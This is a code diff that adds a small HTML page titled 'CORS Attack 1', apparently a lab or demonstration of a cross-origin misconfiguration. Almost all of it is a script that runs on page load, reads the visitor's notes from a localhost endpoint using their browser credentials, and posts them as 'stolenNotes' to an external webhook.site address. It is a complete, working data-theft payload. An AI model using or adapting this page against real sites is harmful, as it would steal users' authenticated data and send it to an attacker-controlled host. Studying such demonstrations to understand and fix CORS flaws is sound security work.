@@ -1,0 +1,18 @@
+<h1>CORS Attack 1</h1>
+
+<script>
+fetch('https://localhost/get-notes', {
+    method: 'GET',
+    credentials: 'include'
+})
+.then(response => response.json())
+.then(data => {
+    fetch('https://webhook.site/e6b991f1-199e-4bba-9abf-172458fcfd7b', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ stolenNotes: data.notes })
+    });
+});
+</script>
